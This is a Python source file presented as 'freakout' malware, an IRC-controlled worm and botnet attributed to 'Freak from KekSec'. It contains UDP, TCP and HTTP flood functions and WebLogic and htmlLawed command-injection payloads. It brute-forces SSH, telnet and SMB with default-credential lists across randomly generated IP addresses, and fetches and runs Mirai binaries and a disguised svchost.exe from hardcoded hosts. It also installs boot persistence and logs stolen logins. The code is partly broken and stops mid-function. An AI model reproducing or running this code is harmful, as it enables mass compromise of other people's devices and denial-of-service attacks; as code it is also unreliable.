#!/usr/bin/python
import sys, re, os, socket, time, select, random
import requests, random
import paramiko
import os
import ssl
from threading import Thread
from struct import pack,unpack
from ctypes import *
from urllib3.exceptions import InsecureRequestWarning

global sshcommand
global botnetsource
global username
global passwd
global ip
global command
global rekdevice
global silentmode
silentmode = 0
sshcommand = ""
little1 = "python setup.py; python3 setup.py; cp setup.py /up-boot; chmod 0777 /up-boot; echo /up-boot > /etc/rc.local"
little2 = "echo fathax homie l33t ipv4 & echo ipv6 scanning all de wAYS > ssh_connected_atleast-was-placeholder.as-well-ssl.txt"
botnetsource = "https://pastebin.com/"
command= sshcommand= rekdevice= "curl " + botnetsource + " -O setup.py; wget " + botnetsource + " -O setup.py; " + "" + little1 + ";" + little2
sshcommand = command
#3-> fiRE CODE OVER HERE W4TCH 0UT
#<-3 cODED BY Freak from KekSec

command +="curl "+botnetsource+" -O setup.py; wget "+botnetsource+" -O setup.py; "+little1+little2


## ## DH ## $$ $$ ##
#DH Virus Code here
#DH is a new age virus from 2025-03-10 fully developed by Freak from Kek Security Or KekSec.
## ## DH ## $$ $$ ##
#DH Virus Code here
#DH is a new age virus from 2025-03-10 fully developed by Freak from Kek Security Or KekSec
## ## DH ## $$ $$ ##
#DH Virus Code here
#DH is a new age virus from 2025-03-10 fully developed by Freak from Kek Security Or KekSec.

def udp(ip, port, time):
    s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    endtime=time.clock() + time
    while time.clock() < endtime:
        s.sendto("\xff" * 65507, ip, port)

def tcp(ip, port, packetsize, time):
    s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    endtime=time.clock() + time
    while time.clock() < endtime:
        try:
            s.connect((ip, port))
            s.send("\xff" * packetsize)
        except:
            pass




## ## DH ## $$ $$ ##
#DH Virus Code here
#DH is a new age virus from 2025-03-10 fully developed by Freak from Kek Security Or KekSec.


def exploit(target):
    global command
    request = requests.session()
    headers = {'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'}
    print("[+] Sending GET Request for weblogic ....")
    try:
        GET_Request = request.get(target + "/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('" + command + "');\");", verify=False, headers=headers)
        print("[$] Exploit successful! Hooray..")
    except:
        pass
    print("[+] Sending htmlLawed 1.2.5 exploit ....")
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((target, 443))
        s=ssl.wrap_socket(s)
        s.send("POST / HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: curl/8.10.1\r\nAccept: */*\r\nCookie: sid=foo\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nsid=foo&hhook=exec&text=" + command)
        s.recv(1024)
        s.close()
        print("[+] Successful sending! Lets hope it worx!")
    except:
        pass
    print("[-] Exploits have failed !! now SSH bruting....")
    passwd = ["root xc3511", "root 12345789", "root vizxv", "root admin", "admin admin", "root 888888", "root xmhdipc", "root default", "root jauntech", "root 123456", "root 54321", "support support", "root (none)", "admin password", "root root", "root 12345", "user user", "admin (none)", "root pass", "admin admin1234", "root 1111", "admin smcadmin", "admin 1111", "root 666666", "root password", "root 1234", "root klv123", "Administrator admin", "service service", "supervisor supervisor", "guest guest", "guest 12345", "admin1 password", "administrator 1234", "666666 666666", "888888 888888", "ubnt ubnt", "root klv1234", "root Zte521", "root hi3518", "root jvbzd", "root anko", "root zlxx.", "root 7ujMko0vizxv", "root 7ujMko0admin", "root system", "root ikwb", "root dreambox", "root user", "root realtek", "root 000000", "admin 1111111", "admin 1234", "admin 12345", "admin 54321", "admin 123456", "admin 7ujMko0admin", "admin pass", "admin meinsm", "tech tech"]
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((target, 22))
        s=ssl.wrap_socket(s)
        fgh=open(sshcommand, "a+")
        fgh.write(target + "\r\n")
        fgh.close()
        s.close()
    except:
        return
    try:
        for result in passwd:
            try:
                result = result.split(" ")
                ssh.connect(target, result[0], password=result[1])
                stdin, stdout, stderr = ssh.exec_command('system')
                stdin, stdout, stderr = ssh.exec_command('enable')
                stdin, stdout, stderr = ssh.exec_command('push')
                stdin, stdout, stderr = ssh.exec_command('root')
                stdin, stdout, stderr = ssh.exec_command('admin')
                stdin, stdout, stderr = ssh.exec_command('telnetd')
                stdin, stdout, stderr = ssh.exec_command('cat | sh')
                stdin, stdout, stderr = ssh.exec_command(command)
                x = stdout.readlines()
                print(x)
                for line in x:
                    print(line)
            except:
                pass
            ssh.close()
    except:
        pass
    
# Function to send messages to the channel
def send_message(message):
    ircsock.send(bytes(f"PRIVMSG {channel} :{message}\n", "UTF-8"))

global server
global channel
global ip
global key
global botnick
global serverip
global binprefix
global binname
global nameprefix
global echo
global tftp
global wget
global logins
global wizard_made
global ran
global ip
global fh
global server
global channel
global key

# Scanner
global honeycheck, exploited
honeycheck = 1
exploited = 0
global w
# WIZARD MAGIC RUNNING HERE 81-Bykers->HA>-->=SCRAM-="
w = "Wizard warning - Freak is a powerful real world wizard that uses Chi energy and meditation and prayer for all my power. KekSec ROX!"
wizard_made = w
ip = ""
serverip = "138.201.175.55"
nameprefix = "enemy"
binprefix = "/f/" + nameprefix
binname = binprefix.split("/")[-1]
fh = open("bots.txt","a+")

def chunkify(lst,n):
    return [ lst[i::n] for i in range(n) ]
global running
running = 0

wizard_made = []
tftp = 0
wget = 0
echo = 0
logins = 0
ran = 0
def printStatus():
    global echo
    global tftp
    global wget
    global logins
    global ran
    while 1:
        time.sleep(5)
        print("\033[32m[\033[31m+\033[32m] Logins: " + str(logins) + "     Ran:" + str(ran) + "  Echoes:" + str(echo) + " Wgets:" + str(wget) + " TFTPs:" + str(tftp) + "\033[37m")

def readUntil(tn, advances, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.1)
        for advance in advances:
            if advance in buf: return buf
    return ""

def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""

def contains(data, array):
    for test in array:
        if test in data:
            return True
    return False

def split_bytes(s, n):
    assert n >= 4
    start = 0
    lens = len(s)
    while start < lens:
        if lens - start <= n:
            yield s[start:]
            return # StopIteration
        end = start + n
        assert end > start
        yield s[start:end]
        start = end



class FileWrapper():
    def __init__(self, f):
        self.f = f

    # blindly read n bytes from the front of the file
    def read(self, n):
        result = self.f.read(n)
        return result

    # read n bytes from the next alignment of k from start
    def read_align(self, n, k=None, start=0):
        # if no alignment specified, assume aligned to n
        if not k:
            k = n
        remainder = self.f.tell() % k
        num_pad = (k-remainder) % k
        pad = self.read(num_pad)
        result = self.read(n)
        return result

    # unpack the data using the endian
    def read_uint(self, n, endian):
        result = self.read_align(n)
        unpk_byte = ""
        if endian == 1:
            unpk_byte = "<"
        elif endian == 2:
            unpk_byte = ">"
        else:
            unpk_byte = "@"
        format_ = unpk_byte+"B"*n
        return unpack(format_, result)

    def seek(self, offset):
        self.f.seek(offset)

    def tell(self):
        return self.f.tell()
   
class ElfHeader():
    def __init__(self, e_ident):
        f=open(".tempelf", "wb")
        f.write(e_ident)
        f.close()
        f=open(".tempelf", "rb")
        self.f = FileWrapper(f)
        self.e_ident = self.f.read(16)     #unsigned char
        assert(self.e_ident[0:4] == "\x7fELF")
        EI_CLASS = ord(self.e_ident[4])
        # 1 means little endian, 2 means big endian
        EI_DATA = ord(self.e_ident[5])
        if EI_DATA == 1:
            self.endian = 1
        elif EI_DATA == 2:
            self.endian = 2
        else:
            assert(False)
        # this should be 1
        EI_VERSION = ord(self.e_ident[6])
        assert(EI_VERSION == 1)
        # see the tables at http://www.sco.com/developers/gabi/latest/ch4.eheader.html
        EI_OSABI = self.e_ident[7]
        EI_ABIVERSIO = self.e_ident[8]
        self.e_type = None      #Elf32_Half
        self.e_machine = None       #Elf32_Half
        self.e_version = None       #Elf32_Word
        self.e_entry = None     #Elf32_Addr
        self.e_phoff = None     #Elf32_Off
        self.e_shoff = None     #Elf32_Off
        self.e_flags = None     #Elf32_Word
        self.e_ehsize = None        #Elf32_Half
        self.e_phentsize = None     #Elf32_Half
        self.e_phnum = None     #Elf32_Half
        self.e_shentsize = None     #Elf32_Half
        self.e_shnum = None     #Elf32_Half
        self.e_shstrndx = None      #Elf32_Half

    def parse_header(self):

        #Magic number
        assert(self.e_ident[0:4] == "\x7fELF")
        # 1 means 32, 2 means 64
        EI_CLASS = ord(self.e_ident[4])
        #TODO: Are these the right sizes to put here?
      
        # 1 means little endian, 2 means big endian
        EI_DATA = ord(self.e_ident[5])
        self.bytes = EI_CLASS
        # this should be 1
        EI_VERSION = ord(self.e_ident[6])
        # see the tables at http://www.sco.com/developers/gabi/latest/ch4.eheader.html
        EI_OSABI = self.e_ident[7]
        EI_ABIVERSIO = self.e_ident[8]

        #Parse the rest of the header
        self.e_type = self.Half(self.f)
        self.e_machine = self.Half(self.f)

        section = {}
        section["e_machine"] = self.e_machine
        section["endian"] = self.endian
        return section

    def Half(self, f):
        return self.f.read_uint(2, self.endian)


honeycheck = 1
global badips
badips=[]
def fileread():
    fh=open("honeypots.txt", "rb")
    data=fh.read()
    fh.close()
    return data
def clientHandler(c, addr):
    global badips
    try:
        if addr[0] not in badips and addr[0] not in fileread():
            print(addr[0] + ":" + str(addr[1]) + " has connected!")
            request = recvTimeout(c, 8912)
            if "curl" not in request and "Wget" not in request:
                if addr[0] not in fileread():
                    fh=open("honeypots.txt", "a")
                    fh.write(addr[0]+"\n")
                    fh.close()
                    os.popen("iptables -A INPUT -s " + addr[0] + " -j DROP")
                badips.append(addr[0])
                print(addr[0] + ":" + str(addr[1]) + " is a fucking honeypot!!!")
                c.send("fuck you GOOF HONEYPOT GET OUT\r\n")
                for i in range(10):
                    c.send(os.urandom(65535*2))
        else:
            c.send("fuck you GOOF HONEYPOT GET OUT\r\n")
            for i in range(10):
                c.send(os.urandom(65535*2))
        c.close()
    except Exception as e:
        #print str(e)
        pass

def honeyserver(honeyport):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', honeyport))
    s.listen(999999999)
    while 1:
        try:
            c, addr = s.accept()
            Thread(target=clientHandler, args=(c, addr,)).start()
        except:
            pass

def scanner():
    global honeycheck, exploited
    honeycheck = 1
    exploited = 0
    while 1:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.6)
            try:
                s.connect((cheese, 22))
                exploited=exploit(cheese)
                wizard_made+=1
            except:
                try:
                    s.connect((cheese, 23))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 2323))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 8080))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 8081))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 53))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 135))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 139))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
                try:
                    s.connect((cheese, 445))
                    if honeycheck:
                        time.sleep(1)
                    exploited=exploit(cheese)
                    wizard_made+=1
                except:
                    pass
        except Exception as e:
            print(str(e))
            pass
            
if honeycheck==1:
    Thread(target=honeyserver, args=(8080,)).start()

def infect(ip, port=23, username="", password=""):
    global running
    global echo
    global tftp
    global wget
    global logins
    global wizard_made
    if ip in wizard_made:
        return
    infectedkey = "PERROR"
    
    global running, cheese
    running += 1
    threadID = running
    while 1:
        port1 = 22
        port2 = 80
        port3 = 8080
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.37)
        cheese = str(random.randint(1,233)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255)) + "." + str(random.randint(1,255))
        try:
            s.connect((cheese, port1))
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(cheese, port = port1, username=username, password=password, timeout=3)
            ssh.exec_command(rekdevice)
            ssh.close()
        except:
            pass
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(cheese, port = port2, username=username, password=password, timeout=3)
            ssh.exec_command(rekdevice)
            ssh.close()
        except:
            pass
        try:
            threading.Thread(target = infect, args=(cheese, port1, username, password)).start()           
            print(b'[LIVE] [+] -------> Server IP address: -> {cheese}:{port1} + ~SSH Infection-=-=')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(7)
            s.connect((cheese, port2))
            s.close()
            threading.Thread(target = infect, args=(cheese, port2, username, password)).start()
            infect(cheese, port2, username, password)            
            print(b'[LIVE] [+] -------> Server IP address 2: -> {cheese}:{port2} + ~Hidden Infection-=-=')
            print(b'Server IP address: {cheese} {port2}')
            s.close()
        except Exception as e:
            print(str(e))
        try:
            threading.Thread(target = infect, args=(cheese, port2, username, password)).start()           
            print(b'[LIVE] [+] -------> Server IP address: -> {cheese}:{port1} + ~SSH Infection-=-=')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(7)
            s.connect((cheese, port2))
            s.close()
            threading.Thread(target = infect, args=(cheese, port2, username, password)).start()
            infect(cheese, port2, username, password)            
            print(b'[LIVE] [+] -------> Server IP address 2: -> {cheese}:{port2} + ~Hidden Infection-=-=')
            print(b'Server IP address: {cheese} {port2}')
            s.close()
        except Exception as e:
            print(str(e))
            running -= 1
        try:
            threading.Thread(target = infect, args=(cheese, port3, username, password)).start()           
            print(b'[LIVE] [+] -------> Server IP address: -> {cheese}:{port3} + ~Exploit Infection-=-=')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(7)
            s.connect((cheese, port3))
            s.close()
            infect(cheese, port3, username, password)            
            print(b'[LIVE] [+] -------> Server IP address 2: -> {cheese}:{port3} + ~Hidden Infection-=-=')
            print(b'Server IP address: {cheese} {port2}')
            s.close()
        except Exception as e:
            print(str(e))
    try:
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(username + "\r\n")
            time.sleep(0.1)
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(password + "\r\n")
            time.sleep(0.8)
        else:
            pass
        prompt = ''
        prompt += recvTimeout(tn, 8192)
        if ">" in prompt and "ONT" not in prompt:
            success = True
        elif "#" in prompt or "$" in prompt or "@" in prompt or ">" in prompt:
            if "#" in prompt:
                prompt = "#"
            elif "$" in prompt:
                prompt = "$"
            elif ">" in prompt:
                prompt = ">"
            success = True
        else:
            tn.close()
            return
    except:
        tn.close()
        return
    if success == True:
        try:
            tn.send("enable\r\n")
            tn.send("system\r\n")
            tn.send("shell\r\n")
            tn.send("sh\r\n")
            tn.send("echo -e '\\x41\\x4b\\x34\\x37'\r\n")
        except:
            tn.close()
            return
        time.sleep(1)
        try:
            buf = recvTimeout(tn, 8192)
        except:
            tn.close()
            return
        if "AK47" in buf:
            if honeycheck == 1:
                tn.send("wget http://" +serverip + ":" + str(8080) + "/bins/mirai.arm; chmod 0777 mirai.arm;ls mirai.arm; ./mirai.arm &\r\n");
                tn.send("curl http://" +serverip + ":" + str(8080) + "/bins/mirai.arm; chmod 0777 mirai.arm;ls mirai.arm; ./mirai.arm &\r\n");
                time.sleep(3)
                recvTimeout(tn, 8192)
                if ip in badips:
                    running -= 1
                    return
            tn.send("cd /tmp ; cd /home/$USER ; cd /var/run ; cd /mnt ; cd /root ; cd /\r\n")
            tn.send("cat /proc/mounts;busybox cat /proc/mounts\r\n")
            mounts = recvTimeout(tn, 1024*1024)
            for line in mounts.split("\n"):
                try:
                    path = line.split(" ")[1]
                    if " rw" in line:
                        tn.send("echo -e '%s' > %s/.keksec; cat %s/.keksec;busybox cat %s/.keksec; rm %s/.keksec;busybox rm %s/.keksec\r\n" % ("\\x41\\x4b\\x34\\x37", path, "\\x41\\x4b\\x34\\x37", path, path, path, path, path))
                        if "AK47" in recvTimeout(tn, 1024*1024):
                            tn.send("cd %s\r\n" % path) #cd into the writeable directory
                except:
                    continue
            try:
                data=""
                tn.send("echo -en \"START\"\r\n")
                c = 0
                while 1:
                    data+=recvTimeout(tn, 100)
                    if data=="":
                        running -= 1
                        try:
                            tn.close()
                        except:
                            pass
                        return
                    if "START" in data:
                        break
                tn.send("PS1= ; cat /bin/echo ; busybox cat /bin/echo\r\n")
                data=""
                data+=recvTimeout(tn, 0xff00)
                st=0
                while st<len(data):
                    if data[st] == "\x7f":
                        data=data[st:(len(data) % 0xff00)]
                        continue
                    else:
                        st+=1
                elfheader=data[data.find("ELF")-1:(len(data) % 0xff00)]
                if elfheader[0:4]!="\x7fELF":
                    running -= 1
                    try:
                        tn.close()
                    except:
                        pass
                    return
            except:
                running -= 1
                try:
                    tn.close()
                except:
                    pass
                return
            try:
                header = ElfHeader(elfheader).parse_header()
                EM_NONE = 0
                EM_M32 = 1
                EM_SPARC = 2
                EM_386 = 3
                EM_68K = 4 #// m68k
                EM_88K = 5 #// m68k
                EM_486 = 6 #// x86
                EM_860 = 7 #// Unknown
                EM_MIPS = 8 #/* MIPS R3000 (officially, big-endian only) */
                #/* Next two are historical and binaries and modules of these types will be rejected by Linux. */
                EM_MIPS_RS3_LE = 10 #/* MIPS R3000 little-endian */
                EM_MIPS_RS4_BE = 10 #/* MIPS R4000 big-endian */
                EM_PARISC = 15 #/* HPPA */
                EM_SPARC32PLUS = 18 #/* Sun's "v8plus" */
                EM_PPC = 20 #/* PowerPC */
                EM_PPC64 = 21 #/* PowerPC64 */
                EM_SPU = 23 #/* Cell BE SPU */
                EM_ARM = 40 #/* ARM 32 bit */
                EM_SH = 42 #/* SuperH */
                EM_SPARCV9 = 43 #/* SPARC v9 64-bit */
                EM_H8_300 = 46 #/* Renesas H8/300 */
                EM_IA_64 = 50 #/* HP/Intel IA-64 */
                EM_X86_64 = 62 #/* AMD x86-64 */
                EM_S390 = 22 #/* IBM S/390 */
                EM_CRIS = 76 #/* Axis Communications 32-bit embedded processor */
                EM_M32R = 88 #/* Renesas M32R */
                EM_MN10300 = 89 #/* Panasonic/MEI MN10300, AM33 */
                EM_OPENRISC = 92 #/* OpenRISC 32-bit embedded processor */
                EM_BLACKFIN = 106 #/* ADI Blackfin Processor */
                EM_ALTERA_NIOS2 = 113 #/* Altera Nios II soft-core processor */
                EM_TI_C6000 = 140 #/* TI C6X DSPs */
                EM_AARCH64 = 183 #/* ARM 64 bit */
                EM_TILEPRO = 188 #/* Tilera TILEPro */
                EM_MICROBLAZE = 189 #/* Xilinx MicroBlaze */
                EM_TILEGX = 191 #/* Tilera TILE-Gx */
                EM_FRV = 0x5441 #/* Fujitsu FR-V */
                EM_AVR32 = 0x18ad #/* Atmel AVR32 */
                if (header["e_machine"][0] == EM_ARM or header["e_machine"][0] == EM_AARCH64):
                    arch = "arm"
                elif (header["e_machine"][0] == EM_MIPS or header["e_machine"][0] == EM_MIPS_RS3_LE):
                    if (header["endian"] == 1):
                        arch = "mpsl"
                    else:
                        arch = "mips"
                elif (header["e_machine"][0] == EM_386 or header["e_machine"][0] == EM_486 or header["e_machine"][0] == EM_860 or header["e_machine"][0] == EM_X86_64):
                    arch = "x86"
                elif (header["e_machine"][0] == EM_SPARC or header["e_machine"][0] == EM_SPARC32PLUS or header["e_machine"][0] == EM_SPARCV9):
                    arch = "spc"
                elif (header["e_machine"][0] == EM_68K or header["e_machine"][0] == EM_88K):
                    arch = "m68k"
                elif (header["e_machine"][0] == EM_PPC or header["e_machine"][0] == EM_PPC64):
                    arch = "ppc"
                elif (header["e_machine"][0] == EM_SH):
                    arch = "sh4"
                try:
                    arch
                except NameError:
                    try:
                        tn.close()
                    except:
                        pass
                    running -= 1
                    return
            except:
                pass
            print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip, arch))
            logins += 1
            fh.write(ip + ":" + str(port) + " " + username + ":" + password + "\n")
            fh.flush()
            rekdevice = "cd /tmp or cd $(find / -writable | head -n 1);\r\nwget http://" + serverip + binprefix  + arch + """ -O """ + nameprefix  +  arch + """; busybox wget http://""" + serverip + binprefix  + arch + """ -O """ + nameprefix  +  arch + """; chmod 777 """ + binname  + arch + """; ./""" + binname  + arch + """; rm -f """ + binname  + arch + "\r\npause\r\n"
            rekdevice = rekdevice.replace("\r", "").split("\n")
            for rek in rekdevice:
                tn.send(rek + "\r\n")
                time.sleep(1.5)
                buf = recvTimeout(tn, 1024*1024)
                loaded = False
                if "bytes" in buf:
                    print("\033[32m[\033[31m+\033[32m] \033[33mwget \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    tftp += 1
                    loaded = True
                elif "saved" in buf:
                    print("\033[32m[\033[31m+\033[32m] \033[33mWGET \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    wget += 1
                    loaded = True
                if infectedkey in buf:
                    ran += 1
                    print("\033[32m[\033[31m+\033[32m] \033[35mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    f=open("infected.txt", "a")
                    f.write(ip +":" + str(port) + " " + username + ":" + password + "\r\n")
                    f.close()
                first = True
                count = 0
                hexdata = []
                for chunk in split_bytes(open("bins/dlr." + arch, "rb").read(), 128):
                    hexdata.append(''.join(map(lambda c:'\\x%02x'%c, map(ord, chunk))))
                parts = len(hexdata)
                for hexchunk in hexdata:
                    seq = ">" if first else ">>"
                    tn.send("echo -ne \"" + hexchunk + "\" " + seq + " updDl\r\n") #;busybox echo -ne '" + hexchunk + "' " + seq + " .updDl\r\n")
                    first = False
                    count += 1
                    time.sleep(0.01)
                print("\033[32m[\033[31m+\033[32m] \033[33mECHO \033[31m---> \033[32m" + ip + " \033[31m---> \033[36m(" + str(count) + "/" + str(parts) + ") " + arch + "\033[37m")
                tn.send("chmod 777 updDl;busybox chmod 777 updDl\r\n")
                tn.send("./updDl\r\n")
                time.sleep(1.7)
                tn.send("./enemy")
                tn.send("rm -rf ./updDl\r\n")
                time.sleep(0.1)
                buf = recvTimeout(tn, 1024*1024)
                if "FIN" in buf:
                    echo += 1
                    print("\033[32m[\033[31m+\033[32m] \033[33mECHOLOADED \033[31m---> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[31m ---> \033[35m%s\033[37m" %(username, password, ip, binary))
                    tn.close()
                    f=open("echoes.txt","a")
                    f.write(ip +":23 " + username + ":" + password + "\r\n")
                    f.close()
                    wizard_made.append(ip)
                if infectedkey in buf:
                    ran += 1
                    f=open("infected.txt", "a")
                    f.write(ip +":23 " + username + ":" + password + "\r\n")
                    f.close()
                    print("\033[32m[\033[31m+\033[32m] \033[35mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, ip))
                    tn.close()
       
    else:
        try:
            tn.close()
        except:
            pass
    running -= 1
    return

import os
from pypsexec.client import Client
import socket
import time
import threading
import itertools
import random
 
from impacket.examples.smbclient import MiniImpacketShell
from impacket.smbconnection import SMBConnection
fh1=open("user.txt", "a+")
fh2=open("pass.txt", "a+")
users=fh1.read().replace("\r", "").split("\n")
passwords=fh2.read().replace("\r", "").split("\n")
fh1.close()
fh2.close()
global maxthreadsglobal
maxthreadsglobal=500
global globalthreads
globalthreads = 0

def testPW(ip, user, passwd, fh):
    global globalthreads
    globalthreads += 1
    try:
        smbClient = SMBConnection(ip, ip, sess_port=445)
        smbClient.login(username, password, '', '', '')
        os.popen("psexec \\" + ip + " -u " + user + + " -p \"" + password + " powershell -NoP -NonI -W Hidden -Exec Bypass \"(New-Object System.Net.WebClient).DownloadFile(\\\"http://209.74.72.224/svchost.exe\\\",\\\"$env:temp\\svchost.exe\\\"); Start-Process \\\"$env:temp\\svchost.exe\\\"\"")
        print("HAX0RED ----> " + ip + ":" + user + ":" + passwd)
        fh.write("HAX0RED ----> " + ip + ":" + user + ":" + passwd + "\r\n")
        fh.flush()
        globalthreads -= 1
        return True
        
    except Exception as e:
        pass
 
    print("T3ST3D ----> " + ip + ":" + user + ":" + passwd)
    globalthreads -= 1
    return False
def brute(ip, fh):
    global maxthreadsglobal
    global globalthreads
    print("BRUTING ----> " + ip)
    threads = 0
    maxthreads = 50
    for user in users:
        for passwd in passwords:
            threads += 1
            if threads == maxthreads or globalthreads >= maxthreadsglobal:
                time.sleep(random.randrange(1,10))
                threads = 0
            try:
                t=threading.Thread(target=testPW, args=(ip, user, passwd, fh,))
                t.start()
            except:
                time.sleep(random.randrange(1,10))
                try:
                    t=threading.Thread(target=testPW, args=(ip, user, passwd, fh,))
                    t.start()
                except:
                    pass
def Scan(IP):
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((IP, 445))
        s.close()
        return True
    except:
        return False
 
def gen_IP():
    not_valid = [10,127,169,172,192,185]
    first = random.randrange(1,256)
    while first in not_valid:
        first = random.randrange(1,256)
    ip = ".".join([str(first),str(random.randrange(1,256)),
    str(random.randrange(1,256)),str(random.randrange(1,256))])
    return ip
 
def gen_IP_block():
    not_valid = [10,127,169,172,192,185]
    first = random.randrange(1,256)
    while first in not_valid:
        first = random.randrange(1,256)
    ip = ".".join([str(first),str(random.randrange(1,256)),
    str(random.randrange(1,256))])
    return ip+".0-255"
 
def ip_range(input_string):
    octets = input_string.split('.')
    chunks = [map(int, octet.split('-')) for octet in octets]
    ranges = [range(c[0], c[1] + 1) if len(c) == 2 else c for c in chunks]
 
    for address in itertools.product(*ranges):
        yield '.'.join(map(str, address))
def HaxThread(fh):
    while 1:
        try:
            IP = gen_IP()
            if Scan(IP):
                if Scan('.'.join(IP.split(".")[:3])+".2") and Scan('.'.join(IP.split(".")[:3])+".254"):#entire ip range most likely pointed to one server
                    brute(IP,fh)
                    continue
                else:
                    for IP in ip_range('.'.join(IP.split(".")[:3])+".0-255"):
                        if Scan(IP):
                            brute(IP,fh)
        except Exception as e:
            print(str(e))
            pass
 
threads = 384
 
fh = open("smb_vulnz.txt","a")
threadcount = 0
for i in range(0,threads):
    try:
        threading.Thread(target=HaxThread, args=(fh,)).start()
        threadcount += 1
    except:
        pass
print("[*] Started " + str(threadcount) + " scanner threads!")
print("Scanning... Press enter 3 times to stop.")
 
for i in range(0,10):
    input("")
 
os.kill(os.getpid(),9)

hostlink = "https://pastebin.com/raw/uZnUnsAM" # update later link
server = "irc.synirc.net"  # irc server
channel = "#windoez"    # Channel to join for all the funzies
key = "swegfeg" # password



# Pronounced "malrate"

botnick = "Malr8." + str(random.randrange(0,999999999)) + "." + os.name + "." + str(random.randrange(0,9999)) + "." + str(os.cpu_count())      # Bot's nickname
 # Bot's nickname
# Pronounced "mal-rate"
print(botnick)
# Run in a new process and exit.
if os.name == "nt":
    print("windows access os")
    print("windows war os")
    botnick+=".windows"
elif os.name == "linux":
    print("linux access os")
    print("linux war os")
    botnick+=".linux"
else:
    botnick+=".shit"
    print("router hax os")
    print("router maybe-something-specific os")

if(len(sys.argv) > 2):
    print("box")
    pass

banner = ""
def handlr(conn):
    while banner:
        try:
            banner += conn.recv(8912)
        except:
            break
    print("fetched banner ------=========-------->")
    print("\r\n\r\n" + banner)
    print(">-=====================>" + "\r\nsending arrows, pulling on bow, ->, B>====---->")
    time.sleep(340)
    print("--------========------->")
    time.sleep(140)
    print("--------========------->")
    time.sleep(200)
    print("--------========-------)")
    time.sleep(400)
    print("--------========-----==>")

def defender(user, passwd, unknown=""):
    try:
        raise Exception("UNKNOWN", 0)        
    except Exception as e:
        print(str(e.stacktrace()))
        pass
    pass

# Our IP - coded by Freak

Thread(target = defender, args=("root", "root",)).start() # brute single

try:
    Thread(target = defender, args=(123, 466, 887,)).start()
except Exception as e:
    print(str(e.stacktrace()))
try:
    Thread(target = defender, args=(387, 465, 117,)).start()
except Exception as e:
    print(str(e.stacktrace()))
    pass
pass
try:
    Thread(target = defender, args=(278, 465, 817,)).start()
except Exception as e:
    print(str(e.stacktrace()))
pass
try:
    Thread(target = defender, args=(278, 465, 187,)).start()
except Exception as e:
    pass

# Configuration for IRC Settings...
server = "irc.mixxnet.net"  # irc server
channel = "#windoez"    # Channel to join
key = "swegfeg"

#
# freakout malware source code v7.2.0 - all flooders and functions were coded manually by hand no AI assistance was use, whenever I hear people talking about it it's so stupid thing to hear about like roomba
#

def httpflood(url, time):
    while time.clock() < endtime:
        try:
            threading.Thread(target = urllib.request.urlopen, args=(message[1])).start()
        except:
            continue

# coded by #Freak


def serverstart():
        global channel
        # with context.wrap_socket(sock, server_hostname="irc.sorcery.net") as ircsock:
        # Connect to the server
        connected = 0
        while not connected:
            try:
